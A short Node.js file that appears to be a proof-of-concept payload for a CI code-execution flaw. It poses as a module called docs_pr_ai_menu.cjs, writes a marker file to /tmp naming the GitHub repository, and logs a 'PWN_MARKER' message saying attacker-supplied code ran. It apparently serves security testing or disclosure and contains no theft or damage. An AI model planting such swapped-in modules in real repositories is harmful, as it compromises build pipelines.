const fs = require('fs');
fs.writeFileSync('/tmp/ARTIFACT_GIT_CONFIG_RCE', 'attacker-controlled script executed in ' + (process.env.GITHUB_REPOSITORY || 'unknown'));
console.log('PWN_MARKER_9f3c2a: attacker-supplied docs_pr_ai_menu.cjs was loaded and executed');
module.exports = { upsertMenuComment: async () => {} };
